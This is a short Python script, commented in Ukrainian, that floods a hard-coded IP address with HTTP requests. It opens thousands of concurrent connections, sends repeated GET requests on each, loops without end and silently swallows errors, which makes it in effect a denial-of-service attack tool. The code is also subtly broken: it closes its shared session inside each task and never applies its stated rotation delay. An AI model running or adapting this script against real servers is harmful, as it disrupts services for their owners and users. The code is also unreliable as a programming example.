import asyncio
import aiohttp

max_connections = 4500
target_url = "http://46.166.142.81"  # URL цільового сервера
requests_per_connection = 50  # Кількість запитів на одне з'єднання
rotation_interval = 5000  # Інтервал ротації в секундах

async def send_request(session, i):
    url = f"{target_url}/?connection={i}"
    async with session.get(url) as response:
        print(f"Connection {i} sent request")

async def create_connection(session, i):
    try:
        async with session:
            for _ in range(requests_per_connection):
                await send_request(session, i)

            print(f"Connection {i} completed {requests_per_connection} requests")
    except:
        pass  # Обробка помилок, якщо з'єднання перервалося

async def rotation():
    async with aiohttp.ClientSession() as session:
        while True:
            print("Запуск нового циклу ротації...")
            tasks = [create_connection(session, i) for i in range(max_connections)]
            await asyncio.gather(*tasks)
            print(f"Завершено цикл ротації. Наступний запуск через {rotation_interval} сек.")

async def main():
    rotation_task = asyncio.create_task(rotation())
    await rotation_task

if __name__ == "__main__":
    asyncio.run(main())